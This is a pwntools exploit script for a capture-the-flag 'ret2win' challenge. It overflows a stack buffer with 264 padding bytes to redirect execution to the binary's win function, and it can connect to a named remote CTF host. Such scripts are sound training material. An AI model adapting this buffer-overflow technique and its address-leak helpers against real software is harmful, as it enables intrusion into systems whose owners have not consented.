#!/usr/bin/env python3
from pwn import *

exe=ELF("./out")

libc = exe.libc
#if args.REMOTE:
#    libc = ELF("./libc.so.6")

HOST, PORT = "ret2win.ctf.ingeniums.club",1337

context.binary = exe

# Constants

GDBSCRIPT = '''\
b* main+82
c
'''
CHECKING = True

def main():
    global io
    io = conn()
    io.recvuntil("> ")
    
    # payload = cyclic(0x200)
    payload = flat(
        264*b'A',
        exe.sym["win"]+5
    )
    
    io.sendline(payload)
    
    io.interactive()

def leak(buf, offset, leaktype, verbose=False):
    verbose and log.info(f"buf: {buf}")
    leak_addr = unpack(buf.ljust(context.bytes, b"\x00"))
    base_addr = leak_addr - offset
    verbose and log.info(f"{leaktype} leak: {leak_addr:#x}")
    log.success(f"{leaktype} base address: {base_addr:#x}")
    return base_addr

def stop():
    io.interactive()
    io.close()
    exit(1)

def check(predicate, disabled=False):
    if not disabled and CHECKING:
        assert(predicate)

def conn():
    if args.REMOTE:
        p = remote(HOST, PORT,ssl=True)
    elif args.GDB:
        p = gdb.debug(exe.path, gdbscript=GDBSCRIPT)
    else:
        p = process(exe.path)

    return p

if __name__ == "__main__":
    io = None
    try:
        main()
    finally:
        if io:
            io.close()
